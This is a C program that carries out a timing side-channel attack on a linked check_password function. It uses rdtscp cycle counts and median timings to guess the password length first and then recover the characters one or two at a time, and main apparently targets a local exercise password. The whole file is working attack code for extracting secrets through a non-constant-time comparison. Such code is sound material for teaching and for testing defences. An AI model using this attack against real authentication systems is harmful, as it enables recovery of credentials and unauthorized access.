#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define FIRST_CHAR 32
#define CHARACTER_COUNT (127-32)
#define MEASURES_PER_ITEM 10000


extern void init_password();
extern int check_password(char* provided, int length);
extern void print_pwd();

int partition(unsigned long* arr, int start, int end) {
  unsigned long p = arr[end];
  int i = start;
  for (int j = start; j < end; j++) {
    if (arr[j] < p) {
      unsigned long tmp = arr[j];
      arr[j] = arr[i];
      arr[i] = tmp;
      i++;
    }
  }
  unsigned long tmp = arr[end];
  arr[end] = arr[i];
  arr[i] = tmp;
  return i;
}

void quicksort(unsigned long* arr, int start, int end) {
  if (start < end) {
    int p = partition(arr, start, end);
    quicksort(arr, start, p-1);
    quicksort(arr, p+1, end);
  }
}

void sort_array(unsigned long* arr, int length) {
  quicksort(arr, 0, length-1);
}

int guess_length() {
  unsigned long** timings = malloc(50 * sizeof(*timings));
  for (int i = 0; i < 50; i++)
    timings[i] = calloc(MEASURES_PER_ITEM, sizeof(**timings));
  char pwd[50] = { 0 };

  // Getting measurements
  for (int i = 0; i < MEASURES_PER_ITEM; i++) {
    for (int j = 0; j < 50; j++) {
      unsigned int garbage;
      uint64_t timer = __rdtscp(&garbage);
      check_password(pwd, j);
      timer = __rdtscp(&garbage) - timer;
      timings[j][i] = timer;
    }
  }

  // Sorting arrays and keeping means
  unsigned long means[50];
  unsigned long max = 0;
  for (int i = 0; i < 50; i++) {
    sort_array(timings[i], MEASURES_PER_ITEM);
    means[i] = timings[i][MEASURES_PER_ITEM/2];
    max = means[i] > means[max] ? i : max;
  }

  return max;
}

char* guess_password_one_by_one(int length) {
  char* pwd = calloc(length+1, 1);
  unsigned long** timings = malloc(CHARACTER_COUNT * sizeof(*timings));
  for (int i = 0; i < CHARACTER_COUNT; i++)
    timings[i] = calloc(MEASURES_PER_ITEM, sizeof(**timings));
  pwd[length] = '\n';

  for (int i = 0; i < length; i++) {
    for (int j = 0; j < MEASURES_PER_ITEM; j++) {
      for (int c = 0; c < CHARACTER_COUNT; c++) {
        pwd[i] = c + FIRST_CHAR;
        unsigned int garbage;
        uint64_t timer = __rdtscp(&garbage);
        check_password(pwd, length);
        timer = __rdtscp(&garbage) - timer;
        timings[c][j] = timer;
      }
    }

    unsigned long means[CHARACTER_COUNT];
    int max = 0;
    printf("Character %d:\n", i);
    for (int j = 0; j < CHARACTER_COUNT; j++) {
      sort_array(timings[j], MEASURES_PER_ITEM);
      means[j] = timings[j][MEASURES_PER_ITEM/2];
      max = means[j] > means[max] ? j : max;
      /* printf("  %c (%d): %lu\n", j + FIRST_CHAR, j, means[j]); */
      /* printf("     ["); */
      /* for (int k = 0; k < MEASURES_PER_ITEM; k++) */
      /*   printf("%lu ", timings[j][k]); */
      /* printf("\n"); */
    }

    printf("%c (%d)\n", max + FIRST_CHAR, max);

    printf("\n\n\n");

    pwd[i] = max + FIRST_CHAR;

  }

  return pwd;
}

char* guess_password(int length) {
  char* pwd = calloc(length+1, 1);
  unsigned long** timings = malloc(CHARACTER_COUNT * CHARACTER_COUNT * sizeof(*timings));
  for (int i = 0; i < CHARACTER_COUNT * CHARACTER_COUNT; i++)
    timings[i] = calloc(MEASURES_PER_ITEM, sizeof(**timings));
  pwd[length] = '\n';

  for (int i = 0; i < length; i += 2) {
    for (int j = 0; j < MEASURES_PER_ITEM; j++) {
      for (int c = 0; c < CHARACTER_COUNT*CHARACTER_COUNT; c++) {
        pwd[i]   = (c / CHARACTER_COUNT) + FIRST_CHAR;
        pwd[i+1] = (c % CHARACTER_COUNT) + FIRST_CHAR;
        unsigned int garbage;
        uint64_t timer = __rdtscp(&garbage);
        check_password(pwd, length);
        timer = __rdtscp(&garbage) - timer;
        timings[c][j] = timer;
      }
    }

    unsigned long means[CHARACTER_COUNT*CHARACTER_COUNT];
    int max = 0;
    printf("Character %d:\n", i);
    for (int j = 0; j < CHARACTER_COUNT * CHARACTER_COUNT; j++) {
      sort_array(timings[j], MEASURES_PER_ITEM);
      means[j] = timings[j][MEASURES_PER_ITEM/2];
      max = means[j] > means[max] ? j : max;
      printf("  %c%c: %lu\n", (j/CHARACTER_COUNT)+FIRST_CHAR,
             (j%CHARACTER_COUNT)+FIRST_CHAR, means[j]);
    }

    printf("%c%c (%d)\n", (max / CHARACTER_COUNT) + FIRST_CHAR,
           (max % CHARACTER_COUNT) + FIRST_CHAR, max);

    printf("\n\n\n");

    pwd[i] = (max / CHARACTER_COUNT) + FIRST_CHAR;
    pwd[i+1] = (max % CHARACTER_COUNT) + FIRST_CHAR;
  }

  return pwd;
}


int main() {
  init_password();
  int length = guess_length();
  printf("length: %d\n", length);
  char* pwd = guess_password_one_by_one(length);
  printf("Guess: %s\n", pwd);
  print_pwd();
  return 0;
}
